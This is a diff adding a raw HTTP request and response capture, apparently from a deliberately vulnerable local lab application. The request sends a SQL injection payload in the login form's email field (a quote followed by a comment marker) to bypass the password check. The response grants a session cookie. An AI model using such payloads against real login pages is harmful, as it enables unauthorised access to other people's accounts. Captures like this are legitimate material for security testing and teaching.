@@ -1,0 +1,32 @@
+POST http://127.0.0.1:3000/login HTTP/1.1
+Host: 127.0.0.1:3000
+Proxy-Connection: keep-alive
+Content-Length: 41
+Cache-Control: max-age=0
+sec-ch-ua: "Chromium";v="158", "Not.A/Brand";v="24", "Google Chrome";v="158"
+sec-ch-ua-mobile: ?0
+sec-ch-ua-platform: "macOS"
+Upgrade-Insecure-Requests: 1
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/158.0.0.0 Safari/537.36
+Origin: http://127.0.0.1:3000
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/jxl,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Sec-Fetch-Dest: document
+Referer: http://127.0.0.1:3000/login
+Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7
+
+email=ana%40alfa.test%27+--+&password=123HTTP/1.1 303 See Other
+cache-control: no-store
+x-content-type-options: nosniff
+x-frame-options: DENY
+referrer-policy: same-origin
+location: /
+set-cookie: licita_vulneravel=ba2161cf1db6681a213155889751ec0fa2061ff8653f0a0ac2d14767e040d01e; Max-Age=900; Path=/; HttpOnly; SameSite=Lax
+content-length: 0
+Date: Fri, 27 Nov 2026 02:08:46 GMT
+Connection: keep-alive
+Keep-Alive: timeout=72
+
